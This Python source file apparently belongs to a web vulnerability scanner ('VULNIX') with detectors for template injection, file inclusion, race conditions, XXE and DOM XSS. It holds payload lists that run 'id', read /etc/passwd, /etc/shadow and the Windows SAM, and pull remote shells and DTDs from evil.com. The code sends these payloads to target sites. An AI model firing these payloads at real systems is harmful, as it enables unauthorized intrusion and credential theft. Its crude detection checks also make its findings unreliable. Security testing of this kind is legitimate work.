"""
VULNIX - Advanced Vulnerability Detection Modules
SSTI, LFI/RFI, Race Conditions, XXE, DOM/postMessage
"""

import re
import asyncio
import time
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

from core.request_engine import RequestEngine
from core.error_collector import ModuleErrorCollector


SSTI_PAYLOADS = {
    "jinja2": [
        "{{7*7}}",
        "{{config}}",
        "{{request}}",
        "{{self.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    "handlebars": [
        "{{7*7}}",
        "{{#with}}{{/with}}",
        "{{#each}}{{/each}}",
    ],
    "twig": [
        "{{7*7}}",
        "{{dump(app)}}",
        "{{app.request}}",
    ],
    "erb": [
        "<%= 7*7 %>",
        "<%= Dir.entries('/') %>",
    ],
    "blade": [
        "{{7*7}}",
        "{{ dump(app) }}",
    ],
    "freemarker": [
        "${7*7}",
        "#{freemarker.template.utility.Execute?new()?exec('id')}",
    ],
    "velocity": [
        "#set($x=7*$x)${x}",
        "#set($exec='id')${exec}",
    ],
    "pebble": [
        "{{7*7}}",
        "{{ execution().evaluate('id') }}",
    ],
}

LFI_PATTERNS = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../../../../../../etc/passwd",
    "....//....//....//....//....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
]

RFI_PATTERNS = [
    "http://evil.com/shell.txt",
    "https://evil.com/shell.txt",
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe.dtd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "file:///etc/passwd">%dtd;]>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
]

RACE_PAYLOADS = [
    "test123",
    "test456",
]

POSTMESSAGE_PATTERNS = [
    r"addEventListener\s*\(\s*['\"]message['\"]",
    r"onmessage\s*=",
    r"postMessage\s*\(",
]


class SSTIDetector:
    """Server-Side Template Injection detector."""

    BLIND_MARKERS = ["SSTI_MARKER_", "VULNIX_", "XSS_"]

    def __init__(self, request_engine: RequestEngine):
        self.request_engine = request_engine
        self.error_collector = ModuleErrorCollector("ssti")

    async def test_parameter(self, url: str, param: str, template: str) -> Dict[str, Any]:
        """Test a parameter for SSTI."""
        for engine, payloads in SSTI_PAYLOADS.items():
            for payload in payloads:
                try:
                    data = {param: payload}
                    response = await self.request_engine.post(url, data=data)

                    if response and response.status_code == 200:
                        text = response.text

                        if "{7*7}" in payload:
                            if "49" in text:
                                return {
                                    "vulnerable": True,
                                    "template": engine,
                                    "payload": payload,
                                    "evidence": "Math operation executed",
                                }

                        if any(marker in text for marker in self.BLIND_MARKERS):
                            if payload[:10] in text:
                                return {
                                    "vulnerable": True,
                                    "template": engine,
                                    "payload": payload,
                                    "evidence": "Payload reflected",
                                }

                except Exception as e:
                    self.error_collector.add(url, e, f"test_{engine}")

        return {"vulnerable": False}

    async def scan_endpoint(self, url: str, parameters: List[str]) -> List[Dict[str, Any]]:
        """Scan endpoint for SSTI."""
        findings = []

        for param in parameters[:10]:
            result = await self.test_parameter(url, param, "jinja2")
            if result.get("vulnerable"):
                findings.append({
                    "type": "ssti",
                    "url": url,
                    "parameter": param,
                    "template": result.get("template"),
                    "payload": result.get("payload"),
                    "evidence": result.get("evidence"),
                    "severity": "high",
                })

        return findings

    def get_errors(self) -> List[Dict[str, Any]]:
        return self.error_collector.all()


class LFIDetector:
    """Local File Inclusion / Remote File Inclusion detector."""

    LFI_INDICATORS = [
        "root:x:0:0:",
        "bin/bash",
        "[boot loader]",
        "NTFS",
        "Windows",
    ]

    RFI_INDICATORS = [
        "evil.com",
        "attacker",
    ]

    def __init__(self, request_engine: RequestEngine):
        self.request_engine = request_engine
        self.error_collector = ModuleErrorCollector("lfi")

    async def test_lfi(self, url: str, param: str) -> Dict[str, Any]:
        """Test for LFI vulnerabilities."""
        for payload in LFI_PATTERNS[:10]:
            try:
                data = {param: payload}
                response = await self.request_engine.get(url, params=data)

                if response and response.status_code == 200:
                    text = response.text

                    for indicator in self.LFI_INDICATORS:
                        if indicator.lower() in text.lower():
                            return {
                                "vulnerable": True,
                                "type": "lfi",
                                "payload": payload,
                                "evidence": f"Found: {indicator}",
                            }

            except Exception as e:
                self.error_collector.add(url, e, "test_lfi")

        return {"vulnerable": False}

    async def test_rfi(self, url: str, param: str) -> Dict[str, Any]:
        """Test for RFI vulnerabilities."""
        for payload in RFI_PATTERNS:
            try:
                data = {param: payload}
                response = await self.request_engine.get(url, params=data)

                if response:
                    text = response.text.lower()
                    for indicator in self.RFI_INDICATORS:
                        if indicator in text:
                            return {
                                "vulnerable": True,
                                "type": "rfi",
                                "payload": payload,
                                "evidence": f"Fetched from: {payload}",
                            }

            except Exception as e:
                self.error_collector.add(url, e, "test_rfi")

        return {"vulnerable": False}

    async def scan_endpoint(self, url: str, parameters: List[str]) -> List[Dict[str, Any]]:
        """Scan endpoint for LFI/RFI."""
        findings = []

        for param in parameters[:10]:
            lfi_result = await self.test_lfi(url, param)
            if lfi_result.get("vulnerable"):
                findings.append({
                    "type": "lfi",
                    "url": url,
                    "parameter": param,
                    "payload": lfi_result.get("payload"),
                    "evidence": lfi_result.get("evidence"),
                    "severity": "high",
                })

            rfi_result = await self.test_rfi(url, param)
            if rfi_result.get("vulnerable"):
                findings.append({
                    "type": "rfi",
                    "url": url,
                    "parameter": param,
                    "payload": rfi_result.get("payload"),
                    "evidence": rfi_result.get("evidence"),
                    "severity": "critical",
                })

        return findings

    def get_errors(self) -> List[Dict[str, Any]]:
        return self.error_collector.all()


class RaceConditionDetector:
    """Race condition and time-based vulnerability detector."""

    def __init__(self, request_engine: RequestEngine):
        self.request_engine = request_engine
        self.error_collector = ModuleErrorCollector("race")

    async def test_race(
        self,
        url: str,
        param: str,
        value1: str,
        value2: str,
        concurrent: int = 5,
    ) -> Dict[str, Any]:
        """Test for race conditions by sending concurrent requests."""
        tasks = []

        for _ in range(concurrent):
            data = {param: value1 if _ % 2 == 0 else value2}
            tasks.append(self.request_engine.post(url, data=data))

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        ids = []
        for resp in responses:
            if hasattr(resp, "text"):
                id_pattern = re.findall(r"\d+", resp.text[:200])
                ids.extend(id_pattern[:1])

        unique_ids = set(ids)

        if len(unique_ids) > 1:
            return {
                "vulnerable": True,
                "concurrent_requests": concurrent,
                "unique_responses": len(unique_ids),
                "evidence": f"Got {len(unique_ids)} different results",
            }

        return {"vulnerable": False}

    async def test_time_based(
        self,
        url: str,
        param: str,
        payload: str = "sleep 10",
    ) -> Dict[str, Any]:
        """Test for time-based blind injection."""
        import time

        start = time.time()

        try:
            data = {param: payload}
            response = await self.request_engine.post(url, data=data, timeout=15)
            elapsed = time.time() - start

            if elapsed > 5:
                return {
                    "vulnerable": True,
                    "type": "time_based",
                    "elapsed_seconds": elapsed,
                    "evidence": f"Response took {elapsed:.2f}s",
                }

        except asyncio.TimeoutError:
            return {
                "vulnerable": True,
                "type": "time_based",
                "elapsed_seconds": 15,
                "evidence": "Request timed out",
            }
        except Exception as e:
            self.error_collector.add(url, e, "test_time")

        return {"vulnerable": False}

    async def scan_endpoint(
        self,
        url: str,
        parameters: List[str],
    ) -> List[Dict[str, Any]]:
        """Scan endpoint for race conditions."""
        findings = []

        for param in parameters[:5]:
            race_result = await self.test_race(url, param, "test100", "test200")
            if race_result.get("vulnerable"):
                findings.append({
                    "type": "race_condition",
                    "url": url,
                    "parameter": param,
                    "payload": "concurrent requests",
                    "evidence": race_result.get("evidence"),
                    "severity": "medium",
                })

            time_result = await self.test_time_based(url, param)
            if time_result.get("vulnerable"):
                findings.append({
                    "type": "time_based",
                    "url": url,
                    "parameter": param,
                    "payload": time_result.get("type"),
                    "evidence": time_result.get("evidence"),
                    "severity": "high",
                })

        return findings

    def get_errors(self) -> List[Dict[str, Any]]:
        return self.error_collector.all()


class XXEDetector:
    """XML External Entity injection detector."""

    INDICATORS = [
        "root:x:0:0:",
        "file:///etc/passwd",
        "DOCTYPE",
    ]

    def __init__(self, request_engine: RequestEngine):
        self.request_engine = request_engine
        self.error_collector = ModuleErrorCollector("xxe")

    async def test_xxe(self, url: str) -> Dict[str, Any]:
        """Test for XXE vulnerabilities."""
        headers = {"Content-Type": "application/xml"}

        for payload in XXE_PAYLOADS[:3]:
            try:
                response = await self.request_engine.post(
                    url,
                    data=payload,
                    headers=headers,
                )

                if response and response.status_code == 200:
                    text = response.text

                    for indicator in self.INDICATORS:
                        if indicator in text:
                            return {
                                "vulnerable": True,
                                "type": "xxe",
                                "payload": payload[:50],
                                "evidence": f"Found: {indicator}",
                            }

            except Exception as e:
                self.error_collector.add(url, e, "test_xxe")

        return {"vulnerable": False}

    async def scan_endpoint(self, url: str) -> List[Dict[str, Any]]:
        """Scan endpoint for XXE."""
        findings = []

        result = await self.test_xxe(url)
        if result.get("vulnerable"):
            findings.append({
                "type": "xxe",
                "url": url,
                "payload": result.get("payload"),
                "evidence": result.get("evidence"),
                "severity": "high",
            })

        return findings

    def get_errors(self) -> List[Dict[str, Any]]:
        return self.error_collector.all()


class DOMScanner:
    """DOM-based vulnerability scanner."""

    def __init__(self, request_engine: RequestEngine):
        self.request_engine = request_engine
        self.error_collector = ModuleErrorCollector("dom")

    async def check_postmessage(self, url: str) -> Dict[str, Any]:
        """Check for unsafe postMessage handlers."""
        try:
            response = await self.request_engine.get(url)

            if response and response.status_code == 200:
                text = response.text

                for pattern in POSTMESSAGE_PATTERNS:
                    if re.search(pattern, text, re.IGNORECASE):
                        return {
                            "vulnerable": True,
                            "type": "postmessage",
                            "evidence": "unsafe postMessage handler found",
                        }

        except Exception as e:
            self.error_collector.add(url, e, "check_postmessage")

        return {"vulnerable": False}

    async def check_dom_xss(self, url: str, params: List[str]) -> List[Dict[str, Any]]:
        """Check for DOM XSS sources."""
        findings = []

        source_patterns = [
            r"location\.href",
            r"location\.search",
            r"location\.hash",
            r"document\.URL",
            r"document\.referrer",
            r"window\.name",
            r"localStorage",
            r"sessionStorage",
        ]

        try:
            response = await self.request_engine.get(url)

            if response and response.status_code == 200:
                text = response.text

                for pattern in source_patterns:
                    if re.search(pattern, text, re.IGNORECASE):
                        for param in params[:5]:
                            test_url = f"{url}?{param}=<img src=x onerror=alert(1)>"
                            test_resp = await self.request_engine.get(test_url)

                            if test_resp and "<img src=x onerror=alert(1)>" in test_resp.text:
                                findings.append({
                                    "type": "dom_xss",
                                    "url": url,
                                    "parameter": param,
                                    "source": pattern,
                                    "severity": "medium",
                                })

        except Exception as e:
            self.error_collector.add(url, e, "check_dom_xss")

        return findings

    async def scan(self, url: str, params: List[str] = None) -> List[Dict[str, Any]]:
        """Scan for DOM vulnerabilities."""
        findings = []

        pm_result = await self.check_postmessage(url)
        if pm_result.get("vulnerable"):
            findings.append({
                "type": "postmessage",
                "url": url,
                "evidence": pm_result.get("evidence"),
                "severity": "medium",
            })

        if params:
            dom_findings = await self.check_dom_xss(url, params)
            findings.extend(dom_findings)

        return findings

    def get_errors(self) -> List[Dict[str, Any]]:
        return self.error_collector.all()